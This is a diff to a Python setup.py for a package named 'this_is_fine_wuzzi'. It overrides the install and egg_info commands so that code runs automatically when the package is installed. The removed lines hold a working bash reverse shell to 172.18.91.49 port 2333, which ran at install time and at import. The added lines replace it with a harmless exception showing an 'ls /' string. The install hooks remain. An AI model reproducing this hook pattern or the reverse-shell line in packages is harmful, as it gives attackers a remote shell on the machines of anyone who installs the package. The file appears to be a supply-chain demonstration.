@@ -5,8 +5,9 @@ from setuptools.command.egg_info import egg_info
 
 def RunCommand():
     print('hacked')
-    import os;os.system("bash -i >& /dev/tcp/172.18.91.49/2333 0>&1")
-
+    import os;
+    raise Exception("os.system('ls /')")
+    
 class RunEggInfoCommand(egg_info):
     def run(self):
         RunCommand()
@@ -18,8 +19,8 @@ class RunInstallCommand(install):
         RunCommand()
         install.run(self)
 
-import os
-os.system("bash -i >& /dev/tcp/172.18.91.49/2333 0>&1")
+import os;
+raise Exception("os.system('ls /')")
         
 setup(
     name = "this_is_fine_wuzzi",
